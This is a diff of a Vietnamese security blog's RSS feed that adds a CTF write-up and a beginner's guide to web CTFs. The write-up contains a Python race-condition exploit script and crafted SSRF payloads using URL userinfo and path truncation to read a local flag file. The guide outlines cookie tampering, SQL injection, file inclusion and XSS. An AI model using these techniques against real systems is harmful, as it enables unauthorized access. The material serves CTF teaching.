@@ -1,4 +1,290 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>@sting8k</title><description>@sting8k</description><link>http://localhost:2368/</link><generator>Ghost 0.7</generator><lastBuildDate>Tue, 23 Feb 2016 17:39:23 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>[CTF] Write-up Internetwache CTF 2016 Web50,70,80</title><description>&lt;h3 id="web50"&gt;Web50&lt;/h3&gt;
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>@sting8k</title><description>@sting8k</description><link>http://localhost:2368/</link><generator>Ghost 0.7</generator><lastBuildDate>Tue, 21 Nov 2017 16:08:08 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>[SVATTT 2017] Writeup Web daemon: The Last Bullet</title><description>&lt;p&gt;Challenge:  &lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;a href="http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/"&gt;http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Một chút thính lúc vào game: robots.txt&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;User-agent: *  
+Disallow: /backkup-1337/  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Gắp được ra 3 cái params &lt;code&gt;insert&lt;/code&gt;, &lt;code&gt;access_key&lt;/code&gt; và &lt;code&gt;path&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Nếu &lt;strong&gt;không&lt;/strong&gt; set param &lt;code&gt;insert&lt;/code&gt; =&gt; Select và hiện kết quả theo &lt;code&gt;access_key&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class="language-php"&gt;...
+$access_key=mysql_real_escape_string($_GET['access_&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/svattt-2017-writeup-web-daemon-the-last-bullet/</link><guid isPermaLink="false">7191f76f-5686-4383-8531-6c9a319a83fa</guid><dc:creator>Do Anh</dc:creator><pubDate>Tue, 21 Nov 2017 14:02:00 GMT</pubDate><media:content url="http://localhost:2368/content/images/2017/11/wallhaven-494982-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2017/11/wallhaven-494982-1.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;p&gt;Challenge:  &lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;a href="http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/"&gt;http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Một chút thính lúc vào game: robots.txt&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;User-agent: *  
+Disallow: /backkup-1337/  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Gắp được ra 3 cái params &lt;code&gt;insert&lt;/code&gt;, &lt;code&gt;access_key&lt;/code&gt; và &lt;code&gt;path&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Nếu &lt;strong&gt;không&lt;/strong&gt; set param &lt;code&gt;insert&lt;/code&gt; =&gt; Select và hiện kết quả theo &lt;code&gt;access_key&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class="language-php"&gt;...
+$access_key=mysql_real_escape_string($_GET['access_key']);
+
+$sql = "SELECT url from local_bookmark where access_key='".$access_key."' order by id desc limit 1";
+...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Nếu set param &lt;code&gt;insert&lt;/code&gt; =&gt; Insert vào db dữ liệu lấy từ &lt;code&gt;access_key&lt;/code&gt; và &lt;code&gt;path&lt;/code&gt;, ngay sau đó thì ... delete ?? 😀 ??&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class="language-php"&gt;$url = "http://tradahacking.vn".$path."/phiasaumotcogai.html"; 
+
+$url = mysql_real_escape_string($url);
+
+if(preg_match('/(#|\?|&amp;amp;)/i', $url))  
+    {
+        exit('Bad words!');
+    }
+$sql = "INSERT INTO local_bookmark (url, access_key) VALUES ('" .$url. "', '".$access_key."');";
+...
+include_once("delete.php");  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Okay, select thì méo có gì để select rồi, insert thì bị delete ngay :v&lt;/p&gt;
+
+&lt;p&gt;Nhưng ... &lt;br&gt;
+Ngay từ đầu khi đọc source, mình nhận thấy khá bất thường khi tác giả luôn đặt hàm connect, close db ở từng file, cộng thêm việc vừa insert vừa delete nhìn vội vler 😂 . &lt;/p&gt;
+
+&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-9-36-03-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya, nó có mùi &lt;strong&gt;Race condition&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Code khai thác:  &lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-python"&gt;import thread  
+import time  
+import requests  
+import random
+
+def exploit(access_key):  
+    resp = requests.get("http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/index.php?path=xxx&amp;amp;insert=1&amp;amp;access_key=xxxxx"
+                    +str(access_key))
+
+try:  
+    ak = random.randint(1000000,9999999)
+    thread.start_new_thread( exploit, (ak,) )
+    thread.start_new_thread( exploit, (ak,) )
+    resp = requests.get("http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/index.php?access_key=xxxxx"+str(ak))
+    print "http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/index.php?access_key=xxxxx"+str(ak)
+    print resp.text
+except:  
+    print "Error: unable to start thread"
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-10-02-49-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;
+
+&lt;p&gt;Insert được rồi, giờ sao?&lt;/p&gt;
+
+&lt;p&gt;Để ý một chút:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-php"&gt;$url = "http://tradahacking.vn".$path."/phiasaumotcogai.html"; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Đây là cái sẽ được cho vào DB, và rồi "bị" select ra, đẩy qua hàm &lt;code&gt;file_get_contents&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-php"&gt;$sql = "SELECT url from local_bookmark where access_key='".$access_key."' order by id desc limit 1";
+$result = $conn-&amp;gt;query($sql);
+
+if ($result-&amp;gt;num_rows &amp;gt; 0) {  
+    // output data of each row
+    while($row = $result-&amp;gt;fetch_assoc()) {
+        $bookmark = $row["url"];
+        //echo "Your Temporary bookmark is: " . $bookmark."&amp;lt;br&amp;gt;";//For harder version, my Ninjas ;)
+    echo "Ok, Ok !!! You win ;)";
+    }
+}
+echo file_get_contents($bookmark);  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Tới lúc dùng tới hint của @g4mm4:  &lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Local System:1337&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Mình có thể biến cái &lt;code&gt;$url&lt;/code&gt; trên kia thành dạng như này:  &lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://tradahacking.vn:xyz@localhost:1337/phiasaumotcogai.html  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thay vì tradahacking.vn là domain thì nó sẽ bị chuyển thành username 😌&lt;/p&gt;
+
+&lt;p&gt;Nhưng giờ lại kẹt tiếp phát nữa, cái cần bây là directory listing của &lt;a href="http://localhost:1337"&gt;http://localhost:1337&lt;/a&gt; chứ không phải &lt;a href="http://localhost:1337/phiasaumotcogai.html"&gt;http://localhost:1337/phiasaumotcogai.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;May thay trong lúc chưa ra cái hint &lt;code&gt;local system:1337&lt;/code&gt; (mà thực ra cái hint này nó có sẵn từ đầu trên title &lt;a href="http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/"&gt;Web&lt;/a&gt; rồi &lt;br&gt;
+ mà mình k để ý 😩), mình đã đẩy request trên kia về server riêng và fuzz linh tinh :v&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;119.81.181.252 - - [xx/Nov/2017 xx:xx:28] "GET /./././../../././././././././././././././/../././/phiasa HTTP/1.0" 404 -  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;À há, path truncation. Do giới hạn số ký tự của field url trong db.&lt;/p&gt;
+
+&lt;p&gt;Nhiệm vụ bây giờ chỉ là đẩy request về server riêng, truncate cho vừa đủ hết cái file html kia, xong thay lại localhost:1337 vào (cho đỡ nhầm lẫn 😥)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;index.php?path=:xyz@localhost:1337/.//./././../../././././././././././././././/.././././././&amp;amp;insert=1&amp;amp;access_key=xxxxx  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-10-39-36-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;
+
+&lt;p&gt;Get flag.php  &lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;index.php?path=:wtf@localhost:1337/./././././././././././././././././././././././././flag.php&amp;amp;insert=1&amp;amp;access_key=xxxxx  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-10-41-55-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;</content:encoded></item><item><title>[CTF] Làm thế nào để bắt đầu với CTF mảng Web</title><description>&lt;p&gt;Web là một trong những mảng dễ tiếp cận khi chơi CTF. &lt;strong&gt;Vậy bắt đầu CTF mảng Web như thế nào?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Giờ đặt một website trước mặt mình thì không thể cứ thế mà làm. Làm gì? Tìm flag - một chuỗi bí mật do người ra đề giấu ở&lt;/p&gt;</description><link>http://localhost:2368/ctf-lam-the-nao-de-bat-dau-voi-ctf-mang-web/</link><guid isPermaLink="false">0deb8673-9a96-475a-9870-e210c2a3d7e1</guid><category>web</category><category>CTF</category><category>learn</category><category>beginner</category><category>sql</category><category>xss</category><category>lfi</category><category>rfi</category><dc:creator>Do Anh</dc:creator><pubDate>Mon, 07 Mar 2016 03:11:04 GMT</pubDate><media:content url="http://localhost:2368/content/images/2016/03/1024px-DEF_CON_17_CTF_competition.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2016/03/1024px-DEF_CON_17_CTF_competition.jpg" alt="[CTF] Làm thế nào để bắt đầu với CTF mảng Web"&gt;&lt;p&gt;Web là một trong những mảng dễ tiếp cận khi chơi CTF. &lt;strong&gt;Vậy bắt đầu CTF mảng Web như thế nào?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Giờ đặt một website trước mặt mình thì không thể cứ thế mà làm. Làm gì? Tìm flag - một chuỗi bí mật do người ra đề giấu ở đâu đó quanh cái web. Muốn tìm được nó trước hết phải xem đề bài gợi ý cái gì, cho cái gì, trong web có gì, làm sao để khai thác mấy cái đó. Từ đây lại có một vấn đề: &lt;strong&gt;Phải hiểu về web trước đã&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Nói thêm một chút là ở bài viết này mình sẽ không đi sâu vào chi tiêt, mình chỉ dừng lại ở việc đặt ra các vấn đề quan trọng mà các bạn cần tìm hiểu&lt;/em&gt;&lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h4 id="webhotngthno"&gt;Web hoạt động thế nào?&lt;/h4&gt;
+
+&lt;p&gt;Chúng ta sẽ cần nắm kiến thức về web qua những vấn đề như thế này:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Cách hoạt động của web từ phía client cho đến phía server sẽ có những gì? &lt;/li&gt;
+&lt;li&gt;Client gửi request cho server và nhận lại response như thế nào? Qua đâu? (HTTP, HTTP Header, HTTP Methods)&lt;/li&gt;
+&lt;li&gt;Cách client và server lưu trữ thông tin của nhau (qua cơ sở dữ liệu, cookie, session, …).&lt;/li&gt;
+&lt;li&gt;Các ngôn ngữ cấu thành 1 trang web hoặc thường được dùng khi xây dựng web. (HTML, CSS, JS, PHP, SQL ...)&lt;/li&gt;
+&lt;li&gt;Thông tin whois của 1 trang web (ip, owner,...).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id="1linquannhttp"&gt;1. Liên quan đến HTTP&lt;/h4&gt;
+
+&lt;p&gt;Mỗi khi truy cập một website, từ phía client phải gửi &lt;strong&gt;request&lt;/strong&gt; lên server qua &lt;strong&gt;giao thức HTTP&lt;/strong&gt;, và những request này được thể hiện dưới dạng &lt;strong&gt;HTTP header&lt;/strong&gt;. Giống như việc muốn gửi bức thư thì phải có địa chỉ nhận, tên người viết, thông tin về người viết, nội dung dung thư thì có yêu cầu,... Các headers cũng chứa những thông tin tương tự như vậy.&lt;/p&gt;
+
+&lt;p&gt;Những headers này có rất nhiều nên các bạn có thể tự google tìm hiểu. &lt;em&gt;Đặc biệt là chú ý về &lt;strong&gt;cookie, user-agent&lt;/strong&gt;, là 2 trường hay được dùng trong các bài ctf.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Gủi một HTTP request đi cũng có thể gửi được bằng nhiều dạng khác nhau. Các dạng này chính là các &lt;strong&gt;HTTP Methods&lt;/strong&gt; hay còn gọi là HTTP Verb. Dạng của nó bao gồm GET, POST, PUT, DELETE, OPTIONS,... Thường dùng nhất là &lt;strong&gt;POST và GET&lt;/strong&gt;. Các bạn nên tìm hiểu kỹ điểm giống và khác của 2 methods này. &lt;/p&gt;
+
+&lt;p&gt;Một số bài khi dùng POST, GET đều không nhận được gì từ phía server, nhưng khi đổi sang HEAD, PUT, hoặc method khác thì lại ra kết quả. Lý do là ở file .htaccess đã block 2 method đó. Tham khảo:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.tutorialspoint.com/restful/restful_introduction.htm"&gt;http://www.tutorialspoint.com/restful/restful_introduction.htm&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.htmlgoodies.com/beyond/webmaster/article.php/3899416/What-is-the-htaccess-File-and-What-Can-I-Do-With-It.htm"&gt;.htaccess là gì?&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/11584101/restrict-post-request-the-server"&gt;.htaccess Restrict method POST GET&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Nói tiếp đến &lt;strong&gt;response&lt;/strong&gt;. Hẳn các bạn đã không ít lần gặp những thông báo kiểu &lt;code&gt;404 Not Found&lt;/code&gt; hoặc &lt;code&gt;302 Forbidden&lt;/code&gt; khi truy cập một url nào đó. Đó là vì sau một request được gửi đến server, ta sẽ nhận được response. Trong response, một cái luôn luôn có là &lt;strong&gt;HTTP Status Code. Mỗi đầu số 1xx 2xx 3xx 4xx 5xx có một ý nghĩa khác nhau.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Tham khảo: &lt;a href="http://aptech.vn/kien-thuc-tin-hoc/tim-hieu-co-ban-ve-http-va-dinh-dang-cua-cac-http-message.html"&gt;Tìm hiểu cơ bản về HTTP và định dạng của các HTTP message&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2016/03/Screen-Shot-2016-03-07-at-12-10-19-PM.png" alt="[CTF] Làm thế nào để bắt đầu với CTF mảng Web"&gt;&lt;/p&gt;
+
+&lt;p&gt;Cuối cùng là việc &lt;strong&gt;thao tác với các headers&lt;/strong&gt;. Trên Firefox mình hay dùng addon &lt;a href="https://addons.mozilla.org/en-US/firefox/addon/live-http-headers-fixed-by-dan"&gt;Live Http Headers&lt;/a&gt; hoặc &lt;a href="https://addons.mozilla.org/en-US/firefox/addon/tamper-data/"&gt;Tamper data&lt;/a&gt;. Nâng cao hơn các bạn hãy tập dùng &lt;a href="https://curl.haxx.se/"&gt;curl&lt;/a&gt;, rất tiện và có api cho nhiều ngôn ngữ lập trình.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Tham khảo: &lt;a href="http://curl.haxx.se/docs/httpscripting.html"&gt;http://curl.haxx.se/docs/httpscripting.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id="2linquannccngnnglptrnhweb"&gt;2. Liên quan đến các ngôn ngữ lập trình web&lt;/h4&gt;
+
+&lt;p&gt;Với nhiều bài CTF chúng ta sẽ phải đọc hiểu code, phân tích hoặc đoán code. Nói chung ta cần trang bị kiến thức về lập trình, hiểu từng ngôn ngữ để làm gì. Ví dụ như html, css thì giới hạn cũng để thể hiện giao diện web, ở html5 "xịn" hơn thì làm được game gì đó; js thì làm được nhiều hơn, hiệu ứng, tính toán …, quan trọng mấy thằng này đều là kiểu ngôn ngữ ở phía client, tức là chạy được luôn ở phía máy mình, và mình xem được code gốc của nó.&lt;/p&gt;
+
+&lt;p&gt;Đối với PHP, ASP, JSP,... đây là các ngôn ngữ được biên dịch trên server, và code gốc thì không xem được nhưng có rất nhiều bài CTF chủ động cho người chơi đọc code để phân tích hoặc có lỗi giúp ta có thể đọc code từ đó khai thác.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Túm lại ta cần học HTML, CSS, JS và một ngôn ngữ server nào đó như PHP hoặc JSP (ít nhất ở mức đọc hiểu).&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h4 id="3linquanncookiesession"&gt;3. Liên quan đến Cookie, Session&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Nắm được định nghĩa cookie, session&lt;/li&gt;
+&lt;li&gt;Nắm được cách thức lưu trữ của cookie, session. &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Lưu ý quan trọng là cookie có thể thay đổi được ở phía client. Session thì chỉ đổi được id (tức là làm mới id, hoặc làm rỗng id). Phía server nếu đọc cookie ko phân biệt ip, đặc điểm trình duyệt người dùng,... thì ta có thể dựa vào đó để khai thác. Ví dụ xác thực admin qua cookie (có một trường id=1234; user=guest, giờ nếu sửa thành id=1;user=admin thì sẽ có thể đăng nhập dưới quyền admin).&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Một ví dụ rất cơ bản về cookie: &lt;a href="https://www.youtube.com/watch?v=NrC3129Q55c"&gt;https://www.youtube.com/watch?v=NrC3129Q55c&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Giải thích một chút về clip phía trên như sau.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Phía server có một đoạn code kiểu như thế này:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class="language-javascript"&gt;&amp;lt;?php  
+if(!isset($_COOKIE[‘restricted_login’])){ //check có trường cookie restricted_login chưa?  
+    setcookie(‘restricted_login’,’false’); // nếu chưa thì set với giá trị là False
+} else { // Nếu đã có trường restricted_login
+    if($_COOKIE[‘restricted_login’] == ‘true’){ //nếu giá trị là true thì qua bàn
+    // Qua bàn, + điểm, blah blah ...
+    }
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Đoạn code này sẽ kiểm tra xem ở phía client có trường cookie là &lt;code&gt;restricted_login&lt;/code&gt; chưa, nếu chưa có thì thêm vào và có giá trị là &lt;code&gt;false&lt;/code&gt;. Nếu đã có thì kiểm tra giá trị của &lt;code&gt;restricted_login&lt;/code&gt;, giá trị bằng &lt;code&gt;true&lt;/code&gt; thì được phép qua bàn.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Trong CTF đối khi có một bài SQL injection qua cookie. Nói chung cookie cũng là dữ liệu từ phía người dùng, tức là mình có thể thay đổi, và truyền các dữ liệu sai trái lên server.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h4 id="4linquannsqlinjection"&gt;4. Liên quan đến SQL Injection&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;SQL injection cơ bản&lt;/li&gt;
+&lt;li&gt;SQL injection - Blind: Không thể trực tiếp get ra đoạn dữ liệu mình muốn và phải get từng ký tự, hoặc dựa và các câu lệnh điều kiện đúng sai,... &lt;/li&gt;
+&lt;li&gt;SQL injection - Error based: Có thể nói là mở rộng của blind, tùy vào dữ liệu đúng hoặc sai mà server trả về kết quả khác nhau.&lt;/li&gt;
+&lt;li&gt;SQL injection - Time based: Dùng một câu lệnh SQL chứa lệnh Sleep(), hoặc một hàm nào đó để nghỉ khi gặp điều kiện đúng. Ví dụ IF(điều kiện, điều kiện nếu đúng-&gt; Sleep(10), đk nếu sai -&gt; null) &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;SQL Injection cơ bản mình học qua course này, có thể ko cần học hết, chỉ cần nắm rõ cách khai thác qua SQL sau đó có thể tự tìm hiểu thêm tùy bài ctf: &lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://newdemy.com/courses/sql-injection-online-course-by-hitesh-choudhary"&gt;http://newdemy.com/courses/sql-injection-online-course-by-hitesh-choudhary&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id="5localremotefileinclusion"&gt;5. Local &amp;amp; Remote File Inclusion&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Chi tiết: &lt;a href="http://hakipedia.com/index.php/Local_File_Inclusion"&gt;http://hakipedia.com/index.php/Local&lt;em&gt;File&lt;/em&gt;Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Một clip ví dụ: &lt;a href="https://www.youtube.com/watch?v=s3XQ1n5kdeQ"&gt;https://www.youtube.com/watch?v=s3XQ1n5kdeQ&lt;/a&gt;    &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id="6xss"&gt;6. XSS&lt;/h4&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Mọi thông tin chi tiết xin truy cập vào link sau: &lt;a href="https://viblo.asia/Thanh/posts/73KbvZeLGmWB"&gt;Kĩ thuật tấn công CROSS-SITE SCRIPTING&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id="7luyntp"&gt;7. Luyện tập&lt;/h4&gt;
+
+&lt;p&gt;Đọc qua tất cả những thông tin phía trên thì đúng là có phần hơi quá tải. Lúc đầu mới chơi CTF mình cũng không có nhiều kiến thức đến vậy. Bài viết này mình muốn là một nơi tổng hợp tương đối các kiến thức cần thiết để các bạn biết sẽ cần trang bị những gì, tìm vấn đề ở đâu,... Sau cùng dưới đây là những nơi mình đã luyện tập CTF mà thấy rất hiệu quả&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://hackthis.co.uk"&gt;http://hackthis.co.uk&lt;/a&gt; - Một site phù hợp cho người mới bắt đầu.&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.root-me.org/en/Challenges/Web-Server/"&gt;http://www.root-me.org/en/Challenges/Web-Server/&lt;/a&gt; - Một list challenges bao quát rất nhiều vấn đề, gồm cả các bài LFI/ RFI, các loại SQLi, các tài liệu hướng dẫn.&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://overthewire.org/wargames/natas/"&gt;http://overthewire.org/wargames/natas/&lt;/a&gt; - Gồm cả các dạng bài về Command injection và PHP Objection Injection&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://webhacking.kr"&gt;http://webhacking.kr&lt;/a&gt; - Có khoảng 60 challenges về web từ khó đến dễ. Một số bài hơi mang tính thách đố&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://ringzer0team.com"&gt;http://ringzer0team.com&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Một lưu ý cuối là các bạn hãy kết hợp việc luyện tập ở các site phái trên và việc tham gia các giải ctf mới ra ở &lt;a href="http://ctftime.org"&gt;http://ctftime.org&lt;/a&gt; nữa :D. Chúc các bạn vui vẻ!&lt;/p&gt;</content:encoded></item><item><title>[CTF] Write-up Internetwache CTF 2016 Web50,70,80</title><description>&lt;h3 id="web50"&gt;Web50&lt;/h3&gt;
 
 &lt;p&gt;Bài này cho một đoạn code như sau:&lt;/p&gt;
 
@@ -14,7 +300,7 @@ function myhash($str) {
 }
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Nhìn qua thì có vẻ đoạn hash trên là kết quả&lt;/p&gt;</description><link>http://localhost:2368/ctf-write-up-internetwache-ctf-2016-web50-70-80/</link><guid isPermaLink="false">01d3072c-1be3-4a1d-a275-4c0f96b7f82d</guid><dc:creator>Do Anh</dc:creator><pubDate>Tue, 23 Feb 2016 17:38:00 GMT</pubDate><content:encoded>&lt;h3 id="web50"&gt;Web50&lt;/h3&gt;
+&lt;p&gt;Nhìn qua thì có vẻ đoạn hash trên là kết quả&lt;/p&gt;</description><link>http://localhost:2368/ctf-write-up-internetwache-ctf-2016-web50-70-80/</link><guid isPermaLink="false">01d3072c-1be3-4a1d-a275-4c0f96b7f82d</guid><category>CTF</category><category>web</category><dc:creator>Do Anh</dc:creator><pubDate>Tue, 23 Feb 2016 17:38:00 GMT</pubDate><content:encoded>&lt;h3 id="web50"&gt;Web50&lt;/h3&gt;
 
 &lt;p&gt;Bài này cho một đoạn code như sau:&lt;/p&gt;
 
